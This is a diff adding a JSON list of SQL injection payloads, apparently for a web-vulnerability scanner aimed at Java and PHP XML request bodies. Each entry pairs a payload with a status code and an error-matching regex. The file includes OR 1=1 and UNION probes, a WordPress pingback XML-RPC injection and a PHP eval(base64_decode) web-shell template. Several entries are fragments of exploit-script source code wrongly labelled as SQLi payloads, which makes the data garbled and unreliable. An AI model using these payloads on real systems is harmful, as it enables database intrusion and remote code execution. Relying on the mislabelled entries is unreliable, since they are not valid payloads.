@@ -1,0 +1,156 @@
+[
+  {
+    "payload_id": "OWP-57317",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Java",
+    "injection_point": "body_xml",
+    "payload_string": "'||0/1%20OR%201=1))%20--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-57318",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Java",
+    "injection_point": "body_xml",
+    "payload_string": "'||1/0%20OR%201=1))%20--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-57368",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Java",
+    "injection_point": "body_xml",
+    "payload_string": "\"\\\\' OR 1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64070",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "'conceptid':\"1 union",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64071",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"<?php\",\"\").replace(\"?>\",\"\")          #",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64072",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"base64\").replace(\"\\n\",\"\")     #",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64073",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"<?php eval(base64_decode('%s')); ?>\"%shell #",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64074",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"0x\"+shell.encode(\"hex\")                    #",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64075",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"[    ] exploit: #",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64440",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "'wp_';    #",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64441",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"<?xml version=\\\"1.0\\\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>foobar' UNION",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64445",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"[error]--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64446",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"Username for id = \".$i.\" is:--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  },
+  {
+    "payload_id": "OWP-64447",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "\"Total Number of Users found:--",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|sql|syntax"
+    }
+  }
+]
